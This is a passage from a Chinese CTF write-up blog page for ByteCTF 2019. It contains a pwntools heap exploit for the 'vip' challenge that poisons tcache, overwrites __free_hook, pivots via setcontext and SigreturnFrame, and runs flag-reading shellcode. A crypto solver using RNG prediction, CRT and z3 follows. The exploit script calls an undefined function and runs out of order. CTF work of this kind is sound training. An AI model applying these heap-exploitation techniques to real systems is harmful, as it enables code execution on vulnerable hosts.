class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span> , os = <span class="string">'linux'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">p = process(<span class="string">"./vip"</span>)</span><br><span class="line"><span class="comment">#p = remote("112.126.103.14", 9999)</span></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>   : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : p.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b) </span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a, b)</span><br><span class="line">slog = <span class="keyword">lambda</span> x : log.success(x)</span><br><span class="line">flog = <span class="keyword">lambda</span> x : log.success(x)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.27.so"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(idx)</span>:</span></span><br><span class="line">	sla(<span class="string">": "</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(idx)</span>:</span></span><br><span class="line">	choose(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">": "</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	choose(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">": "</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	choose(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">": "</span>, str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, size, ctx)</span>:</span></span><br><span class="line">	choose(<span class="number">4</span>)</span><br><span class="line">	sla(<span class="string">": "</span>, str(idx))</span><br><span class="line">	sla(<span class="string">": "</span>, str(size))</span><br><span class="line">	sa(<span class="string">": "</span>, ctx)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rule</span><span class="params">(code,jt ,jf ,k)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p16(code) + p8(jt) + p8(jf) + p32(k) </span><br><span class="line"><span class="comment">#def build_rule():</span></span><br><span class="line"><span class="comment">#    payload = ''</span></span><br><span class="line"><span class="comment">#    payload+= rule(0x20 ,0x00, 0x00, 0x00000004) #  A = arch</span></span><br><span class="line"><span class="comment">#    payload+= rule(0x15 ,0x00, 0x03, 0xc000003e) #  if (A != ARCH_X86_64) goto 0010</span></span><br><span class="line"><span class="comment">#    payload+= rule(0x20 ,0x00, 0x00, 0x00000000) #  A = sys_number</span></span><br><span class="line"><span class="comment">#    payload+= rule(0x15 ,0x01, 0x00, 0x00000002) #  if (A == open) goto 0006</span></span><br><span class="line"><span class="comment">#    payload+= rule(0x06 ,0x00, 0x00, 0x7fff0000) #  return ALLOW</span></span><br><span class="line"><span class="comment">#    # payload+= rule(0x15 ,0x03, 0x00, 0x0000003b) #  if (A == execve) goto 0005</span></span><br><span class="line"><span class="comment">#    payload+= rule(0x06 ,0x00, 0x00, 0x00050000) #  return ERRNO(2)</span></span><br><span class="line"><span class="comment">#    return payload</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rule</span><span class="params">()</span>:</span></span><br><span class="line">    payload = <span class="string">''</span></span><br><span class="line">    payload+= rule(<span class="number">0x20</span> ,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00000000</span>) <span class="comment">#  A = arch</span></span><br><span class="line">    payload+= rule(<span class="number">0x15</span> ,<span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00000001</span>) <span class="comment">#  if (A == write) goto 0009</span></span><br><span class="line">    payload+= rule(<span class="number">0x15</span> ,<span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00000000</span>) <span class="comment">#  if (A == read) goto 0009</span></span><br><span class="line">    payload+= rule(<span class="number">0x15</span> ,<span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x0000000a</span>) <span class="comment">#  if (A == mprotect) goto 0009</span></span><br><span class="line">    payload+= rule(<span class="number">0x15</span> ,<span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x40000002</span>) <span class="comment">#  if (A == open) goto 0009</span></span><br><span class="line">    payload+= rule(<span class="number">0x06</span> ,<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00050000</span>) <span class="comment">#  return ERRNO(2)</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">	alloc(i)</span><br><span class="line">pay = <span class="string">"a"</span>*<span class="number">0x20</span>+build_size()</span><br><span class="line"><span class="keyword">print</span> hex(len(pay))</span><br><span class="line">pause()</span><br><span class="line">choose(<span class="number">6</span>)</span><br><span class="line">sa(<span class="string">"name: \n"</span>, pay)</span><br><span class="line">p.interactive()</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x70</span>, <span class="string">"a"</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">alloc(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak = ru(<span class="string">"\x7f"</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">leak = u64(leak)</span><br><span class="line">libc.address = leak<span class="number">-0x3ec090</span></span><br><span class="line">log.info(<span class="string">"libc.address --&gt; %s"</span>,hex(libc.address))</span><br><span class="line">alloc(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="number">16</span>, p64(libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">alloc(<span class="number">4</span>)</span><br><span class="line">alloc(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="number">20</span>, p64(<span class="number">0x404140</span>))</span><br><span class="line">alloc(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="number">0x20</span>, p64(libc.symbols[<span class="string">'setcontext'</span>]+<span class="number">53</span>))</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = <span class="number">0x404150</span></span><br><span class="line">frame.rip = libc.symbols[<span class="string">"mprotect"</span>]</span><br><span class="line">frame.rdx = <span class="number">0x7</span></span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdi = <span class="number">0x404000</span></span><br><span class="line">payload = <span class="string">"./flag\x00\x00"</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0x404260</span>) + p64(<span class="number">1</span>) + p64(<span class="number">1</span>)*<span class="number">32</span></span><br><span class="line">code = <span class="string">'''</span></span><br><span class="line"><span class="string">	mov rdi, 0x404140;</span></span><br><span class="line"><span class="string">	mov rsi, 0;</span></span><br><span class="line"><span class="string">	mov rdx, 0;</span></span><br><span class="line"><span class="string">	mov eax, 0x40000002;</span></span><br><span class="line"><span class="string">	syscall;</span></span><br><span class="line"><span class="string">	mov rdi, 3;</span></span><br><span class="line"><span class="string">	mov rsi, 0x404160;</span></span><br><span class="line"><span class="string">	mov rdx, 100;</span></span><br><span class="line"><span class="string">	mov eax, 0;</span></span><br><span class="line"><span class="string">	syscall;</span></span><br><span class="line"><span class="string">	mov rdi, 1;</span></span><br><span class="line"><span class="string">	mov rsi, 0x404160;</span></span><br><span class="line"><span class="string">	mov rdx, 100;</span></span><br><span class="line"><span class="string">	mov eax, 1;</span></span><br><span class="line"><span class="string">	syscall;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">payload += asm(code)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x1000</span>, payload)</span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0x300</span>, str(frame))</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="betgame"><a href="#betgame" class="headerlink" title="betgame"></a>betgame</h4><p>试了几次，对应关系如下<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">第一关：b --&gt; s ; j --&gt; b ; s -- j ;</span><br><span class="line">第二关：j --&gt; s ; s --&gt; b ; b --&gt; j;</span><br><span class="line">第三关：s --&gt; s ; b --&gt; b ; j --&gt; j;</span><br></pre></td></tr></table></figure></p>
+<p>然后次数只需要30次菜鸡就直接手动出flag了2333<br><img src="/assets/2019bytectf/3.png" alt=""></p>
+<h4 id="jigsaw"><a href="#jigsaw" class="headerlink" title="jigsaw"></a>jigsaw</h4><p>按时间顺序头铁拼图……..<br><img src="/assets/2019bytectf/4.png" alt=""></p>
+<h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="lrlr"><a href="#lrlr" class="headerlink" title="lrlr"></a>lrlr</h4><p>aes随机数漏洞加广播攻击<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">	<span class="keyword">assert</span>( isinstance (mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">	curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">for</span> (m, a ) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:],ai[<span class="number">1</span>:]):</span><br><span class="line">		d = gmpy2.gcd(curm, m)</span><br><span class="line">		c = a - cura</span><br><span class="line">		k = c // d *libnum.invmod(curm // d, m // d)</span><br><span class="line">		cura += curm * k</span><br><span class="line">		curm = curm * m // d</span><br><span class="line">		cura %= curm</span><br><span class="line">	<span class="keyword">return</span> (cura %curm, curm)</span><br><span class="line">rc = RandCrack()</span><br><span class="line">r = []</span><br><span class="line">fd = open(<span class="string">"old"</span>,<span class="string">"r"</span>)</span><br><span class="line">out = fd.readline()</span><br><span class="line"><span class="keyword">while</span> out:</span><br><span class="line">	r.append(int(out.strip(<span class="string">'\n'</span>),<span class="number">10</span>))</span><br><span class="line">	out = fd.readline()</span><br><span class="line"><span class="comment"># print r</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> r[<span class="number">-624</span>:]:</span><br><span class="line">	rc.submit(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">	rc.predict_getrandbits(<span class="number">128</span>)</span><br><span class="line">p = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">	predict = rc.predict_getrandbits(<span class="number">128</span>)</span><br><span class="line">	p.append(predict)</span><br><span class="line"><span class="comment"># print p</span></span><br><span class="line">fd = open(<span class="string">"new"</span>,<span class="string">"r"</span>)</span><br><span class="line">out = fd.readline()</span><br><span class="line">cn = []</span><br><span class="line"><span class="keyword">while</span> out:</span><br><span class="line">	cn.append(long_to_bytes(int(out.strip(<span class="string">'\n'</span>),<span class="number">16</span>)))</span><br><span class="line"><span class="comment">#	print out</span></span><br><span class="line">	out = fd.readline()</span><br><span class="line"><span class="comment"># print cn</span></span><br><span class="line">mn = []</span><br><span class="line">clist = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">	key = long_to_bytes(p[<span class="number">24</span>+i])</span><br><span class="line">	h = AES.new(key, AES.MODE_CBC, <span class="string">b"\x00"</span>*<span class="number">16</span>)</span><br><span class="line">	cnow = h.decrypt(cn[i])</span><br><span class="line">	key = long_to_bytes(p[i])</span><br><span class="line">	h = AES.new(key, AES.MODE_CBC, <span class="string">b"\x00"</span>*<span class="number">16</span>)</span><br><span class="line">	mnow = h.decrypt(cnow)</span><br><span class="line">	mn.append(mnow)</span><br><span class="line">clist = list(map(bytes_to_long, mn))</span><br><span class="line"><span class="comment"># print clist</span></span><br><span class="line">nlist = []</span><br><span class="line">fd = open(<span class="string">"cl"</span>,<span class="string">"r"</span>)</span><br><span class="line">out = fd.readline()</span><br><span class="line"><span class="keyword">while</span> out:</span><br><span class="line">	nlist.append(int(out.strip(<span class="string">'\n'</span>)[<span class="number">2</span>:<span class="number">-1</span>],<span class="number">16</span>))</span><br><span class="line">	out = fd.readline()</span><br><span class="line"><span class="comment"># print nlist</span></span><br><span class="line">m = GCRT(nlist, clist)[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># print m</span></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line"><span class="keyword">if</span> gmpy2.iroot(m, e)[<span class="number">1</span>] == <span class="number">1</span>:</span><br><span class="line">	flag = gmpy2.iroot(m, e)[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">print</span> flag</span><br><span class="line"><span class="comment"># 61406796444626535559771097418338494728649815464609781204026855332620301752444</span></span><br></pre></td></tr></table></figure></p>
+<p>然后z3解方程<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">seed = BitVec(<span class="string">"f"</span>, <span class="number">256</span>+<span class="number">1</span>)</span><br><span class="line">c = <span class="number">0x10000000000000000000000000000000000000000000000000000000000000223</span></span><br><span class="line">m = <span class="number">61406796444626535559771097418338494728649815464609781204026855332620301752444</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(f)</span>:</span></span><br><span class="line">    p = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span><span class="number">-1</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        p = p * <span class="number">2</span></span><br><span class="line">        p = If(Extract(i, i, f)==<span class="number">1</span>, p^f, p)</span><br><span class="line">        p = If(LShR(p, <span class="number">256</span>)==<span class="number">1</span>, p^c, p)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line">solver = Solver()</span><br><span class="line">solver.add(m==calc(seed))</span><br><span class="line">solver.add(Extract(<span class="number">256</span>, <span class="number">256</span>, seed)==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>, <span class="number">257</span>, <span class="number">8</span>):</span><br><span class="line">    solver.add(Extract(i, i, seed)==<span class="number">0</span>)</span><br><span class="line">print(solver)</span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    print(solver.model())</span><br><span class="line"><span class="comment">#flag&#123;very_simple_random_problem&#125;</span></span><br></pre></td></tr></table></figure></p>
+<p>还是太菜了Orz  </p>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/08/25/2019-SUCTF-wp/" title="2019 SUCTF wp">
+                    <div class="prevTitle">2019 SUCTF wp</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:1502404131@qq.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//xi4or0uji.github.io" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#boring-code"><span class="toc-number">1.1.</span> <span class="toc-text">boring_code</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ezCMS"><span class="toc-number">1.2.</span> <span class="toc-text">ezCMS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN"><span class="toc-number">2.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mulnote"><span class="toc-number">2.1.</span> <span class="toc-text">mulnote</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vip"><span class="toc-number">2.2.</span> <span class="toc-text">vip</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MISC"><span class="toc-number">3.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#betgame"><span class="toc-number">3.1.</span> <span class="toc-text">betgame</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jigsaw"><span class="toc-number">3.2.</span> <span class="toc-text">jigsaw</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CRYPTO"><span class="toc-number">4.</span> <span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lrlr"><span class="toc-number">4.1.</span> <span class="toc-text">lrlr</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 60
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href="/2019/09/11/2019-bytectf-wp/">2019 bytectf wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href="/2019/08/25/2019-SUCTF-wp/">2019 SUCTF wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
